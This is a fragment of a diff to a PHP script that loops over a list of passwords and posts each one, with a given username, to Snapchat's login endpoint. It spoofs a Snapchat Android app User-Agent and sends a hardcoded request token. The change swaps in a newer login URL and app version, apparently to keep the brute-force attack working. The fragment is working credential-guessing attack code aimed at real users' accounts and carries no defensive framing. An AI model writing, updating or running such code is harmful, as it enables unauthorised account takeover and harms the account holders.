@@ -42,12 +42,12 @@ if($_POST['login']){
 				foreach($passs as $password)
 				{
 					$snapchat = curl_init();
-					curl_setopt($snapchat, CURLOPT_URL, "https://app.snapchat.com/loq/login");
+					curl_setopt($snapchat, CURLOPT_URL, "https://auth.snapchat.com/scauth/login");
 					curl_setopt($snapchat, CURLOPT_RETURNTRANSFER, 1);
 					curl_setopt($snapchat, CURLOPT_FOLLOWLOCATION, false);
 					curl_setopt($snapchat, CURLOPT_HTTPHEADER, array(
 						'Accept-Language: en;q=0.9',
-						'User-Agent: Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
+						'User-Agent: Snapchat/9.1.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
 					));
 					curl_setopt($snapchat, CURLOPT_POSTFIELDS, "password=${password}&req_token=9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b&timestamp=1509567052943&username=${username}");
 					$response = curl_exec($snapchat);
